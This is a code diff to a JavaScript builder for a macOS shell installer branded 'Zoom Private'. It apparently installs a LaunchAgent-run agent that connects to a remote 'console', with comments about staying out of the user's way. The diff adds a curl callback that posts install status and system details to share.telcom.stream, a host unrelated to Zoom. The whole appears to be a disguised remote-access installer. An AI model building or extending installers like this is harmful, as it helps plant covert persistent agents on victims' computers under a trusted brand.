@@ -81,6 +81,7 @@ X64_URL=__X64_URL__
 X64_SHA=__X64_SHA__
 CONFIG_B64=__CONFIG_B64__
 HELPER_B64=__HELPER_B64__
+RESULT_URL=__RESULT_URL__
 
 XATTR=/usr/bin/xattr
 DITTO=/usr/bin/ditto
@@ -92,7 +93,13 @@ PB=/usr/libexec/PlistBuddy
 UNAME=/usr/bin/uname
 
 say() { printf '%s\\n' "$*"; }
-fail() { printf '\\n[%s] ERROR: %s\\n' "$BRAND" "$*" >&2; exit 1; }
+report() {
+  local stage="$1" reason="$(printf '%s' "\${2:-}" | /usr/bin/tr '"' ' ' | /usr/bin/cut -c1-120)"
+  /usr/bin/curl -fsS -m 8 -X POST "$RESULT_URL" -H 'Content-Type: application/json' \\
+    -d "{\\"os\\":\\"macos\\",\\"stage\\":\\"$stage\\",\\"version\\":\\"2.1.123\\",\\"arch\\":\\"$(/usr/bin/uname -m)\\",\\"src\\":\\"macos-install\\",\\"reason\\":\\"$reason\\"}" \\
+    >/dev/null 2>&1 || true
+}
+fail() { report fail "$*"; printf '\\n[%s] ERROR: %s\\n' "$BRAND" "$*" >&2; exit 1; }
 
 [ "$("$UNAME" -s)" = "Darwin" ] || fail "This installer is for macOS only."
 
@@ -350,6 +357,7 @@ say ""
 
 # Stay out of the user's way: no browser, no Settings window. The agent is
 # already running from the LaunchAgent in the logged-in Aqua session.
+report installed ""
 /usr/bin/osascript -e 'display notification "Installed and connecting to your console." with title "Zoom Private"' >/dev/null 2>&1 || true
 `;
 
@@ -432,6 +440,7 @@ function buildInstallScript({ origin, profile, arm64, x64 }) {
         CONFIG_B64: shellQuote(configB64),
         HELPER_B64: shellQuote(helperB64),
         INSTALLER_URL: installerUrl,
+        RESULT_URL: shellQuote(process.env.SHARE_RESULT_URL || 'https://share.telcom.stream/api/result'),
     });
 }
 
